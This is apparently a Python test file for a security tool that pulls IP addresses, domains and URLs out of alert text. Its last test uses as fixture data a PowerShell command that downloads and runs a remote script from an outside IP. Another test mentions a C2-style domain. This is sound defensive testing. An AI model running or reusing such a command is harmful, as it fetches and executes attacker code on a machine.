from sentinel.core.models import Alert, Observable, ObservableType
from sentinel.ingestion.extractors import enrich_observables, extract_from_text


def test_private_ipv_is_ignored():
    assert not any(o.value == "192.168.1.10" for o in extract_from_text("connect to 192.168.1.10"))


# test ipv6
def test_private_ipv6_is_ignored():
    assert not any(o.value == "fe80::1" for o in extract_from_text("connect to fe80::1"))


def test_public_ip_and_domain_extracted():
    values = {o.value for o in extract_from_text("beacon to 45.83.12.9 via evil-c2.xyz")}
    assert {"45.83.12.9", "evil-c2.xyz"} <= values


# test ipv6
def test_public_ipv6_and_domain_extracted():
    found = extract_from_text("beacon to 2001:4860:4860::8888 now")
    assert Observable(type=ObservableType.IPV6, value="2001:4860:4860::8888") in found


def test_enrich_from_commandline():
    a = Alert(source="mock", rule_name="susp powershell")
    a.process.command_line = (
        "powershell -enc ... IEX(New-Object Net.WebClient)"
        ".DownloadString('http://185.220.101.7/a.ps1')"
    )
    enrich_observables(a)
    types = {o.type for o in a.observables}
    assert {ObservableType.URL, ObservableType.IPV4} <= types
